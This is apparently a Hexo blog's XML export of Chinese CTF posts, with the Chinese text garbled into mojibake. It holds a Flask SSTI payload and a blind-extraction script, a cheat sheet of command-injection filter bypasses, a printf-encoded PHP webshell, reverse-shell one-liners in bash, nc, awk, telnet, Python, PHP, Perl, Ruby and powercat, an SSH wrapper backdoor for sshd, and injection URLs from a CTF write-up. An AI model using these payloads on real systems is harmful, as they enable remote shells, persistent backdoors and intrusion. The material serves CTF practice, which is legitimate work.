data&#x3D;postdata).content</span><br><span class="line">    return &#39;~p0~&#39; in r</span><br><span class="line"></span><br><span class="line">password  &#x3D; &#39;&#39;</span><br><span class="line">s &#x3D; r&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;$\&#39;()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[\\]^&#96;&#123;|&#125;~\&#39;&quot;_%&#39;</span><br><span class="line"></span><br><span class="line">for i in xrange(0,100):</span><br><span class="line">    for c in s:</span><br><span class="line">        payload &#x3D; &#39;&#123;% if &quot;&quot;.__class__.__mro__[2].__subclasses__()[40](&quot;&#x2F;flag&quot;).read()[&#39;+str(i)+&#39;:&#39;+str(i+1)+&#39;] &#x3D;&#x3D; &quot;&#39;+c+&#39;&quot; %&#125;~p0~&#123;% endif %&#125;&#39;</span><br><span class="line">        if check(payload):</span><br><span class="line">            password +&#x3D; c</span><br><span class="line">            break</span><br><span class="line">    print password</span><br></pre></td></tr></table></figure>
<h2 id="0x05å¸¸ç”¨payload"><a href="#0x05å¸¸ç”¨payload" class="headerlink" title="0x05å¸¸ç”¨payload"></a>0x05å¸¸ç”¨payload</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Python</tag>
        <tag>FlaskSSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>å‘½ä»¤æ‰§è¡Œçš„å„ç§å§¿åŠ¿</title>
    <url>/2020/03/12/CTF/linux%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%A7%BF%E5%8A%BF/</url>
    <content><![CDATA[<h1 id="å‘½ä»¤æ‰§è¡Œçš„å„ç§å§¿åŠ¿"><a href="#å‘½ä»¤æ‰§è¡Œçš„å„ç§å§¿åŠ¿" class="headerlink" title="å‘½ä»¤æ‰§è¡Œçš„å„ç§å§¿åŠ¿"></a>å‘½ä»¤æ‰§è¡Œçš„å„ç§å§¿åŠ¿</h1><p>æ¯”èµ›æ¯”çš„æ˜¯ç»„åˆæ‹³,ç†è§£åŸç†,çµæ´»è¿ç”¨</p>
<a id="more"></a>

<h2 id="å§¿åŠ¿"><a href="#å§¿åŠ¿" class="headerlink" title="å§¿åŠ¿"></a>å§¿åŠ¿</h2><h3 id="ä¸€äº›å‘½ä»¤åˆ†éš”ç¬¦"><a href="#ä¸€äº›å‘½ä»¤åˆ†éš”ç¬¦" class="headerlink" title="ä¸€äº›å‘½ä»¤åˆ†éš”ç¬¦"></a>ä¸€äº›å‘½ä»¤åˆ†éš”ç¬¦</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Linuxä¸­ï¼š%0a(å¯ä»¥è¡¨ç¤ºå‘½ä»¤ç»“æŸ) ã€%0d ã€; ã€&amp; ã€| ã€&amp;&amp;ã€||</span><br><span class="line">Windowsä¸­ï¼š%0aã€&amp;ã€|ã€%1aï¼ˆä¸€ä¸ªç¥å¥‡çš„è§’è‰²ï¼Œä½œä¸º.batæ–‡ä»¶ä¸­çš„å‘½ä»¤åˆ†éš”ç¬¦ï¼‰</span><br></pre></td></tr></table></figure>
<h3 id="ç»•è¿‡ç©ºæ ¼"><a href="#ç»•è¿‡ç©ºæ ¼" class="headerlink" title="ç»•è¿‡ç©ºæ ¼"></a>ç»•è¿‡ç©ºæ ¼</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#ä¸‹é¢è¿™äº›éƒ½å¯ä»¥èµ·åˆ°å’Œç©ºæ ¼æ ·çš„ä½œç”¨</span><br><span class="line">&lt;,&lt;&gt;,%20(ç©ºæ ¼),%09(Tab),$IFS$9(ä¹Ÿå¯ä»¥ç”¨$1ç­‰ç­‰,åªæ˜¯$9åœ¨linuxå§‹ç»ˆä¸ºç©ºå­—ç¬¦),$&#123;IFS&#125;,$IFS</span><br></pre></td></tr></table></figure>
<h3 id="å·§ç”¨èŠ±æ‹¬å·"><a href="#å·§ç”¨èŠ±æ‹¬å·" class="headerlink" title="å·§ç”¨èŠ±æ‹¬å·"></a>å·§ç”¨èŠ±æ‹¬å·</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">åœ¨Linux bashä¸­è¿˜å¯ä»¥ä½¿ç”¨&#123;OS_COMMAND,ARGUMENT&#125;æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</span><br><span class="line">&#123;ls,&#125;</span><br><span class="line">Desktop Documents ...</span><br></pre></td></tr></table></figure>
<h3 id="é»‘åå•ç»•è¿‡"><a href="#é»‘åå•ç»•è¿‡" class="headerlink" title="é»‘åå•ç»•è¿‡"></a>é»‘åå•ç»•è¿‡</h3><h4 id="æ‹¼æ¥ç»•è¿‡"><a href="#æ‹¼æ¥ç»•è¿‡" class="headerlink" title="æ‹¼æ¥ç»•è¿‡"></a>æ‹¼æ¥ç»•è¿‡</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">æ¯”å¦‚ï¼ša&#x3D;l;b&#x3D;s;$a$b</span><br><span class="line">å°±ç›¸å½“äºls</span><br></pre></td></tr></table></figure>
<h4 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h4><h5 id="base64ç¼–ç "><a href="#base64ç¼–ç " class="headerlink" title="base64ç¼–ç "></a>base64ç¼–ç </h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#æ³¨æ„,éœ€è¦ä½¿ç”¨ç®¡é“ç¬¦,å› ä¸ºbase64å‘½ä»¤åªæ¥å—æ ‡å‡†çš„è¾“å…¥å’Œè¾“å‡º</span><br><span class="line">echo &quot;Y2F0IC9mbGFn&quot;|base64-d|bash</span><br><span class="line">cat &#x2F;flag</span><br></pre></td></tr></table></figure>
<h5 id="Hex"><a href="#Hex" class="headerlink" title="Hex"></a>Hex</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#ç”±äºlinuxè‡ªåŠ¨è§£æhex,æ‰€ä»¥å¯ä»¥ä½¿ç”¨hexç»•è¿‡,\x20æ˜¯ç©ºæ ¼,ä¹Ÿå¯èƒ½è¢«ban</span><br><span class="line"> &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br></pre></td></tr></table></figure>
<h5 id="oct"><a href="#oct" class="headerlink" title="oct"></a>oct</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#&#123;&#125;æˆ–è€…()éƒ½å¯ä»¥$æŠŠè¿™ä¸ªè¾“å‡ºå½“æˆå˜é‡,ç„¶åæ‰§è¡Œ</span><br><span class="line">$(printf &quot;\154\163&quot;) </span><br><span class="line">&#x3D;&#x3D;&gt;ls</span><br><span class="line"></span><br><span class="line">$(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;) </span><br><span class="line">&#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line"></span><br><span class="line">#å¯ä»¥é€šè¿‡è¿™æ ·æ¥å†™webshell,å†…å®¹ä¸º&lt;?php @eval($_POST[&#39;a&#39;]);?&gt;</span><br><span class="line">$&#123;printf,&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;&#125; &gt;&gt; a.php</span><br><span class="line"></span><br><span class="line">#åˆ©ç”¨åå¼•å·&#96;</span><br><span class="line">&#96;printf &quot;\154\163&quot;&#96;</span><br><span class="line">--&gt;&gt;ls</span><br><span class="line"></span><br><span class="line">#ç»•è¿‡&#x2F;</span><br><span class="line">printf &quot;2f&quot;    </span><br><span class="line">&#x2F;</span><br><span class="line"></span><br><span class="line">æˆ–è€…å¯ä»¥ä»$PATHä¸­å–&#x2F;   </span><br><span class="line">echo $PATH|cut -c 1</span><br></pre></td></tr></table></figure>
<h5 id="å•å¼•å·å’ŒåŒå¼•å·ç»•è¿‡ï¼Œåæ–œæ ç»•è¿‡"><a href="#å•å¼•å·å’ŒåŒå¼•å·ç»•è¿‡ï¼Œåæ–œæ ç»•è¿‡" class="headerlink" title="å•å¼•å·å’ŒåŒå¼•å·ç»•è¿‡ï¼Œåæ–œæ ç»•è¿‡"></a>å•å¼•å·å’ŒåŒå¼•å·ç»•è¿‡ï¼Œåæ–œæ ç»•è¿‡</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ca&#39;&#39;t flag </span><br><span class="line">ca&quot;&quot;t flag  </span><br><span class="line">ca\t flag</span><br><span class="line">éƒ½ç›¸å½“äº</span><br><span class="line">cat flag</span><br></pre></td></tr></table></figure>
<h5 id="é•¿åº¦é™åˆ¶"><a href="#é•¿åº¦é™åˆ¶" class="headerlink" title="é•¿åº¦é™åˆ¶"></a>é•¿åº¦é™åˆ¶</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">linuxä¸‹å¯ä»¥ç”¨ &gt;a åˆ›å»ºæ–‡ä»¶åä¸ºaçš„ç©ºæ–‡ä»¶</span><br><span class="line">ls -t&gt;teståˆ™ä¼šå°†ç›®å½•æŒ‰æ—¶é—´æ’åºåå†™è¿›testæ–‡ä»¶ä¸­</span><br><span class="line">shå‘½ä»¤å¯ä»¥ä»ä¸€ä¸ªæ–‡ä»¶ä¸­è¯»å–å‘½ä»¤æ¥æ‰§è¡Œ</span><br><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;2748</span><br></pre></td></tr></table></figure>
<h5 id="åˆ©ç”¨Shell-ç‰¹æ®Šå˜é‡ç»•è¿‡"><a href="#åˆ©ç”¨Shell-ç‰¹æ®Šå˜é‡ç»•è¿‡" class="headerlink" title="åˆ©ç”¨Shell ç‰¹æ®Šå˜é‡ç»•è¿‡"></a>åˆ©ç”¨Shell ç‰¹æ®Šå˜é‡ç»•è¿‡</h5><table>
<thead>
<tr>
<th align="left">å˜é‡</th>
<th align="left">å«ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td align="left">$0</td>
<td align="left">å½“å‰è„šæœ¬çš„æ–‡ä»¶å</td>
</tr>
<tr>
<td align="left">$n</td>
<td align="left">ä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„å‚æ•°ã€‚n æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œè¡¨ç¤ºç¬¬å‡ ä¸ªå‚æ•°ã€‚ä¾‹å¦‚ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯1ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯2ã€‚è€Œå‚æ•°ä¸å­˜åœ¨æ—¶å…¶å€¼ä¸ºç©ºã€‚</td>
</tr>
<tr>
<td align="left">$#</td>
<td align="left">ä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„å‚æ•°ä¸ªæ•°</td>
</tr>
<tr>
<td align="left">$*</td>
<td align="left">ä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„æ‰€æœ‰å‚æ•°ï¼Œè€Œå‚æ•°ä¸å­˜åœ¨æ—¶å…¶å€¼ä¸ºç©ºã€‚</td>
</tr>
<tr>
<td align="left">$@</td>
<td align="left">ä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„æ‰€æœ‰å‚æ•°ã€‚ï¼Œè€Œå‚æ•°ä¸å­˜åœ¨æ—¶å…¶å€¼ä¸ºç©ºã€‚è¢«åŒå¼•å·åŒ…å‡½æ—¶ï¼Œä¸$*ç¨æœ‰ä¸åŒ</td>
</tr>
<tr>
<td align="left">$?</td>
<td align="left">ä¸Šä¸ªå‘½ä»¤çš„æ¨å‡ºçŠ¶æ€ï¼Œæˆ–å‡½æ•°çš„è¿”å›å€¼</td>
</tr>
<tr>
<td align="left">$$</td>
<td align="left">å½“å‰shellè¿›ç¨‹ID</td>
</tr>
</tbody></table>
<h5 id="é€šé…ç¬¦"><a href="#é€šé…ç¬¦" class="headerlink" title="é€šé…ç¬¦"></a>é€šé…ç¬¦</h5><p>è¯¦ç»†å‚è€ƒ<a href="http://www.ruanyifeng.com/blog/2018/09/bash-wildcards.html">é˜®ä¸€å³°çš„ç½‘ç»œæ—¥å¿—â€”â€”å‘½ä»¤è¡Œé€šé…ç¬¦æ•™ç¨‹</a></p>
<table>
<thead>
<tr>
<th align="left">å­—ç¬¦</th>
<th align="left">è§£é‡Š</th>
</tr>
</thead>
<tbody><tr>
<td align="left">*</td>
<td align="left">åŒ¹é…ä»»æ„é•¿åº¦ä»»æ„å­—ç¬¦</td>
</tr>
<tr>
<td align="left">ï¼Ÿ</td>
<td align="left">åŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦</td>
</tr>
<tr>
<td align="left">[list]</td>
<td align="left">åŒ¹é…æŒ‡å®šèŒƒå›´å†…(list)ä»»æ„å•ä¸ªå­—ç¬¦ï¼Œä¹Ÿå¯ä»¥æ˜¯å•ä¸ªå­—ç¬¦ç»„æˆçš„é›†åˆ</td>
</tr>
<tr>
<td align="left">[^list]</td>
<td align="left">åŒ¹é…æŒ‡å®šèŒƒå›´å¤–çš„ä»»æ„å•ä¸ªå­—ç¬¦æˆ–å­—ç¬¦é›†åˆ</td>
</tr>
<tr>
<td align="left">[!list]</td>
<td align="left">åŒä¸Š</td>
</tr>
<tr>
<td align="left">{str1,str2}</td>
<td align="left">åŒ¹é…str1æˆ–è€…str2å­—ç¬¦ï¼Œä¹Ÿå¯ä»¥æ˜¯é›†åˆ</td>
</tr>
<tr>
<td align="left">IFS</td>
<td align="left">ç”±æˆ–æˆ–</td>
</tr>
<tr>
<td align="left">CR</td>
<td align="left">ç”±äº§ç”Ÿ</td>
</tr>
<tr>
<td align="left">!</td>
<td align="left">æ‰§è¡Œhistoryä¸­çš„å‘½ä»¤</td>
</tr>
</tbody></table>
<p><strong>å…¶ä¸­ï¼š</strong></p>
<ul>
<li>[â€¦]è¡¨ç¤ºåŒ¹é…æ–¹æ‹¬å·ä¹‹ä¸­çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦ã€‚<br>æ¯”å¦‚[aeiou]å¯ä»¥åŒ¹é…äº”ä¸ªå…ƒéŸ³å­—æ¯ï¼Œ[a-z]åŒ¹é…ä»»æ„å°å†™å­—æ¯ã€‚</li>
<li>{â€¦}è¡¨ç¤ºåŒ¹é…å¤§æ‹¬å·é‡Œé¢çš„æ‰€æœ‰æ¨¡å¼ï¼Œæ¨¡å¼ä¹‹é—´ä½¿ç”¨é€—å·åˆ†éš”ã€‚</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo d&#123;a,e,i,u,o&#125;g</span><br><span class="line">dag deg dig dug dog</span><br><span class="line">#å¤§æ‹¬å·å¯ä»¥åµŒå¥—ä½¿ç”¨</span><br><span class="line">echo &#123;j&#123;p,pe&#125;g,png&#125;</span><br><span class="line">jpg jpeg png</span><br><span class="line">#&#123;start..end&#125;åŒ¹é…è¿ç»­å­—ç¬¦</span><br><span class="line">cat &#x2F;f&#123;a..z&#125;ag</span><br><span class="line">cat: &#x2F;faag: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•</span><br><span class="line">cat: &#x2F;fbag: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•</span><br><span class="line">cat: &#x2F;fcag: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•</span><br><span class="line">cat: &#x2F;fdag: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•</span><br><span class="line">cat: &#x2F;feag: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•</span><br><span class="line">cat: &#x2F;ffag: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•</span><br><span class="line">cat: &#x2F;fgag: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•</span><br><span class="line">cat: &#x2F;fhag: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•</span><br><span class="line">cat: &#x2F;fiag: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•</span><br><span class="line">cat: &#x2F;fjag: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•</span><br><span class="line">cat: &#x2F;fkag: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•</span><br><span class="line">flag&#123;test&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<ul>
<li>{â€¦}ä¸[â€¦]æœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„åŒºåˆ«ã€‚å¦‚æœåŒ¹é…çš„æ–‡ä»¶ä¸å­˜åœ¨ï¼Œ[â€¦]ä¼šå¤±å»æ¨¡å¼çš„åŠŸèƒ½ï¼Œå˜æˆä¸€ä¸ªå•çº¯çš„å­—ç¬¦ä¸²ï¼Œè€Œ{â€¦}ä¾ç„¶å¯ä»¥å±•å¼€ã€‚</li>
</ul>
<p>é€šé…ç¬¦æœ‰æ—¶å¯ä»¥èµ·å¥‡æ•ˆ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat fla* </span><br><span class="line">cat$&#123;IFS&#125;fl*</span><br></pre></td></tr></table></figure>
<p>**æ³¨æ„:**åˆæ˜¯è¿˜ä¼šé‡åˆ°flag çš„è´ªå©ªåŒ¹é…<code>/.*f*.l*.a*.g*/</code>è¿™æ˜¯æ‹¼æ¥ä»€ä¹ˆçš„åŸºæœ¬ä¸èƒ½ç”¨,å°±ä¸å¾—ä¸è€ƒè™‘ç¼–ç ç­‰å…¶ä»–å§¿åŠ¿</p>
<h2 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h2><p>ç›®æ ‡æœºæ‰§è¡Œåå¼¹shellçš„å‘½ä»¤,æ”»å‡»æœºç”¨ncå¼€å¯ç›‘å¬å°±è¡Œ</p>
<h3 id="æ”»å‡»æœº"><a href="#æ”»å‡»æœº" class="headerlink" title="æ”»å‡»æœº"></a>æ”»å‡»æœº</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvvp 8080</span><br></pre></td></tr></table></figure>
<h3 id="ç›®æ ‡æœº"><a href="#ç›®æ ‡æœº" class="headerlink" title="ç›®æ ‡æœº"></a>ç›®æ ‡æœº</h3><h4 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.1168.0.1&#x2F;8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<h4 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done</span><br></pre></td></tr></table></figure>
<h4 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">å—å®³ä¸»æœºæ‰§è¡Œ:</span><br><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su;&#x2F;tmp&#x2F;su -oPort&#x3D;8080;   </span><br><span class="line"></span><br><span class="line">æ”»å‡»æœºå™¨:</span><br><span class="line">ssh root@192.168.3.251 -p 8080 [ç”¨æˆ·åroot,å¯†ç éšæ„]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ç®€æ˜“SSH wrapperåé—¨(åŸç†æœªæµ‹è¯•)</span><br><span class="line">å—å®³ä¸»æœºæ‰§è¡Œ:</span><br><span class="line">cd &#x2F;usr&#x2F;sbin</span><br><span class="line">mv sshd ..&#x2F;bin</span><br><span class="line">echo &#39;#!&#x2F;usr&#x2F;bin&#x2F;perl&#39; &gt; sshd</span><br><span class="line">echo &#39;exec &quot;&#x2F;bin&#x2F;sh&quot; if (getpeername(STDIN) &#x3D;~ &#x2F;^..4A&#x2F;);&#39; &gt;&gt;sshd</span><br><span class="line">echo &#39;exec &#123;&quot;&#x2F;usr&#x2F;bin&#x2F;sshd&quot;&#125; &quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;,@ARGV,&#39; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;sshd restart</span><br><span class="line"></span><br><span class="line">æ”»å‡»æœºå™¨:</span><br><span class="line">socat STDIO TCP4:x.x.x.x:22,souceport&#x3D;13337</span><br></pre></td></tr></table></figure>
<h4 id="NCåå¼¹"><a href="#NCåå¼¹" class="headerlink" title="NCåå¼¹"></a>NCåå¼¹</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#nc å¦‚æœå®‰è£…äº†æ­£ç¡®çš„ç‰ˆæœ¬ï¼ˆå­˜åœ¨-e é€‰é¡¹å°±èƒ½ç›´æ¥åå¼¹shellï¼‰</span><br><span class="line">nc -e &#x2F;bin&#x2F;sh ip port</span><br><span class="line"></span><br><span class="line">#å—å®³ä¸»æœº:</span><br><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc x.x.x.x 8080 &gt; &#x2F;tmp&#x2F;f</span><br><span class="line"></span><br><span class="line">#æ”»å‡»ä¸»æœºå…ˆç›‘å¬8080ç«¯å£:</span><br><span class="line">nc -lvvp 8080</span><br><span class="line"></span><br><span class="line">#ç±»ä¼¼çš„å‘½ä»¤</span><br><span class="line">mknod backpipe p;nc ip prot 0&lt;backpipe | &#x2F;bin&#x2F;bash 1&gt;backpipe 2&gt;backpipe</span><br></pre></td></tr></table></figure>
<h4 id="Awk"><a href="#Awk" class="headerlink" title="Awk"></a>Awk</h4><p>**æ³¨æ„:**æ”»å‡»çš„æœºå™¨ç›‘å¬ï¼Œåœ¨æ”¶åˆ°shellçš„æ—¶å€™ä¸å¯ä»¥åªè¾“å…¥enterï¼Œä¸ç„¶ä¼šæ–­å¼€</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">awk &#39;BEGIN&#123;s&#x3D;&quot;&#x2F;inet&#x2F;tcp&#x2F;0&#x2F;ip&#x2F;port&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&#39;</span><br></pre></td></tr></table></figure>
<h4 id="Telnetåå¼¹"><a href="#Telnetåå¼¹" class="headerlink" title="Telnetåå¼¹"></a>Telnetåå¼¹</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">å—å®³ä¸»æœº:</span><br><span class="line">telnet 192.168.3.251 8080 | &#x2F;bin&#x2F;bash | telnet 192.168.3.251 1080</span><br><span class="line">æ”»å‡»ä¸»æœº:</span><br><span class="line">nc -lvp 1080 </span><br><span class="line">nc -lvp 8080 &#x2F;&#x2F;è¿™é‡Œè¾“å…¥å‘½ä»¤å¯ä»¥åœ¨1080çœ‹åˆ°ç»“æœ</span><br><span class="line"></span><br><span class="line">å—å®³æœºå™¨:</span><br><span class="line">mknod test p &amp;&amp; telnet ip  port 0&lt;test | &#x2F;bin&#x2F;bash 1&gt;test</span><br><span class="line">æ”»å‡»ï¼š</span><br><span class="line">nc  -lvvp 8080</span><br><span class="line">topå‘½ä»¤çœ‹ä¸åˆ°ç»“æœï¼Œå› ä¸ºä¸æ˜¯tty</span><br></pre></td></tr></table></figure>
<h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br><span class="line"></span><br><span class="line">#è¿˜å¯ä»¥é…åˆsstiæ³¨å…¥æ‰§è¡Œbashåå¼¹</span><br></pre></td></tr></table></figure>
<h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;ip&quot;,port);exec(&quot;&#x2F;bin&#x2F;bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure>
<h4 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl -e &#39;use Socket;$i&#x3D;&quot;ip&quot;;$p&#x3D;prot;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;bash -i&quot;);&#125;;&#39;</span><br></pre></td></tr></table></figure>
<h4 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e &#39;exit if fork;c&#x3D;TCPSocket.new(&quot;ip&quot;,&quot;port&quot;);while(cmd&#x3D;c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39;</span><br></pre></td></tr></table></figure>
<h4 id="Windwos"><a href="#Windwos" class="headerlink" title="Windwos"></a>Windwos</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WIndows</span><br><span class="line">PS C:\&gt; Import-Module .\powercat.ps1</span><br><span class="line">PS C:\&gt; powercat -c 192.168.3.251 -p 8081 -e cmd -g &gt;&gt; payload.ps1</span><br><span class="line"># nc -lvp 8081 ç„¶åå¼€å§‹ç›‘å¬payloadå›è¿çš„ç«¯å£</span><br><span class="line"></span><br><span class="line">powershell â€“exec bypass â€“Command &quot;&amp; &#123;Import-Module &#39;C:\payload.ps1&#39;&#125;&quot;</span><br><span class="line">#æŒ‚åœ¨åå°æ‰§è¡Œ</span><br></pre></td></tr></table></figure>
<h2 id="æŸ¥çœ‹å†…å®¹å‘½ä»¤"><a href="#æŸ¥çœ‹å†…å®¹å‘½ä»¤" class="headerlink" title="æŸ¥çœ‹å†…å®¹å‘½ä»¤"></a>æŸ¥çœ‹å†…å®¹å‘½ä»¤</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">catã€tacã€moreã€lessã€headã€tailã€nlã€sedã€sortã€uniq</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Linuxå‘½ä»¤</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFSHOWå¹³å°èŒæ–°èµ›WP</title>
    <url>/2020/03/06/CTF_WP/ctfshow_%E8%90%8C%E6%96%B0%E8%B5%9B/</url>
    <content><![CDATA[<h1 id="CTFSHOWå¹³å°èŒæ–°èµ›webã€Cryptoéƒ¨åˆ†misc"><a href="#CTFSHOWå¹³å°èŒæ–°èµ›webã€Cryptoéƒ¨åˆ†misc" class="headerlink" title="CTFSHOWå¹³å°èŒæ–°èµ›webã€Cryptoéƒ¨åˆ†misc"></a>CTFSHOWå¹³å°èŒæ–°èµ›webã€Cryptoéƒ¨åˆ†misc</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="webç­¾åˆ°"><a href="#webç­¾åˆ°" class="headerlink" title="webç­¾åˆ°"></a>webç­¾åˆ°</h3><p>ä»£ç å¾ˆç®€å•,å‘½ä»¤æ‰§è¡Œ</p>
<p>åˆ©ç”¨å‘½ä»¤åˆ†éš”ç¬¦</p>
<a id="more"></a>

<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;e6c17fd8-28c8-4708-8fb5-9463ed500e16.chall.ctf.show&#x2F;?url&#x3D;1;ls;echo</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;e6c17fd8-28c8-4708-8fb5-9463ed500e16.chall.ctf.show&#x2F;?url&#x3D;1;cat%20flag;echo</span><br></pre></td></tr></table></figure>
<h3 id="webç»™å¥¹"><a href="#webç»™å¥¹" class="headerlink" title="webç»™å¥¹"></a>webç»™å¥¹</h3><p>æ‰«ç›®å½•.å‘ç°gitæ³„éœ²,githackæ‰’ä¸‹æ¥,ä»£ç ä¸å…¨,ä½†æ˜¯å¯ä»¥çœ‹åˆ°hitn.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$pass&#x3D;sprintf(&quot;and pass&#x3D;&#39;%s&#39;&quot;,addslashes($_GET[&#39;pass&#39;]));</span><br><span class="line">$sql&#x3D;sprintf(&quot;select * from user where name&#x3D;&#39;%s&#39; $pass&quot;,addslashes($_GET[&#39;name&#39;]));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
